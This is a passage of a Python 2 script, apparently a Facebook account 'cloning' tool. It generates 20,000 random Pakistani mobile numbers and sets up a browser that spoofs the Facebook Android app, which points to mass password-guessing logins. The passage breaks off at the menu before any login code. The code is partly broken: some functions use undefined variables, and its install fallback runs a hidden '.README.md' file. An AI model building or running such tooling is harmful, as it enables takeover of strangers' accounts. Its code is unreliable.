# Decompiled By RANA RAJPOOT
# Github : https://github.com/Usman132/RAJPOOT
# uncompyle6 version 3.7.9
# Original written By RANA RAJPOOT

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(20000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(x):
    for e in x + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = ['   ', '. ', '.. ', '...', '. ', '.. ', '...', '']
    for o in titik:
        print '\r\x1b[1;96m \x1b[1;96m               Load\x1b[1;96ming\x1b[1;0m\x1b[1;96m' + o,
        sys.stdout.flush()
        time.sleep(0.5)

##### LOGO #####
logo = """
              
    \x1b[1;96m  ____    ______   _____  ____    _____   _____   ______
    \x1b[1;96m /\  _`\ /\  _  \ /\___ \/\  _`\ /\  __`\/\  __`\/\__  _\  
    \x1b[1;96m \ \ \L\ \ \ \L\ \\/__/\ \ \ \L\ \ \ \/\ \ \ \/\ \/_/\ \/
    \x1b[1;96m \ \ ,  /\ \  __ \  _\ \ \ \ ,__/\ \ \ \ \ \ \ \ \ \ \ \
    \x1b[1;96m \ \_\ \_\ \_\ \_\ \____/\ \_\   \ \_____\ \_____\ \ \_\
    \x1b[1;96m \/_/\/ /\/_/\/_/\/___/  \/_/    \/_____/\/_____/  \/_/
                                                                                                                                                                      
\x1b[1;96m_________________________________________________
\x1b[1;96m\033[1;96mAuthor   :            RANA RAJPOOT
\x1b[1;96m\033[1;96mFacebook :         https://www.facebook.com/subhan.shahzad.52012
\x1b[1;96m\033[1;96mGitHub   :             https://github.com/Usman132/RAJPOOT.git
\x1b[1;96m\033[1;96mVersion  :              RAJPOOT PRO
\x1b[1;96m__________________________________________________
                                                 """
logo1 = '     \n\n\x1b[4;96mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;96m[1] Jazz    \x1b[1;97m 00,01,02,03,04,05,06,07,08\n\x1b[1;96m[2] Zong    \x1b[1;97m 11,12,13,14,15,16,17\n\x1b[1;96m[3] Warid   \x1b[1;97m 21,22,23,24,25\n\x1b[1;96m[4] Ufone   \x1b[1;97m 30,31,32,33,34,35\n\x1b[1;96m[5] Telenor \x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []

def menu():
    os.system('clear')
    print logo
    print(47*'-')
    print
    jalan ('\x1b[1;96m[1] START Random Number Cloning ')
    print
    print(47*'-')
    action()

def action():
    global cpb
    global oks
    ss = raw_input('\x1b[1;96mselect 1= ')
    if ss == '':
        print '[!] Warning'
        action()
    elif ss == '1':
        tik()
        os.system('clear')
        print logo
        print logo1
        try:
      
